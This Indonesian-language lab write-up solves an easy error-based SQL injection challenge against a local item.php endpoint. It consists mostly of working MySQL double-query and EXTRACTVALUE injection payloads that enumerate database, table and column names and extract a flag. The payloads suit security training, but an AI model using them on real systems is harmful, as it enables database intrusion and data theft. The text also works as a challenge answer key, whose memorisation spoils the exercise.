# Lab E2 - Error Based SQL Injection (Easy)

## Informasi Lab
- **Endpoint**: `/item.php?id=`
- **Tipe**: Error Based Injection
- **Hint**: SQL error visible di halaman

## Analisis

### 1. Identifikasi Kerentanan
Akses endpoint normal:
```
http://localhost/e2/item.php?id=1
```

### 2. Test Error
Input single quote:
```
?id=1'
```
Error SQL akan tampil di halaman.

### 3. Double Query Injection
Karena error ditampilkan, gunakan double query:
```
?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

## Solusi

### Langkah 1 - Dapatkan Nama Database
```
?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

### Langkah 2 - Dapatkan Nama Tabel
```
?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

### Langkah 3 - Dapatkan Nama Kolom
```
?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='flags'),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

### Langkah 4 - Ekstrak Flag
```
?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT flag FROM flags LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)
```

### Payload Alternatif (EXTRACTVALUE)
```
?id=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flags LIMIT 1),0x7e))
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Catatan
- Error based berguna saat UNION tidak bisa digunakan
- Flag akan muncul di pesan error
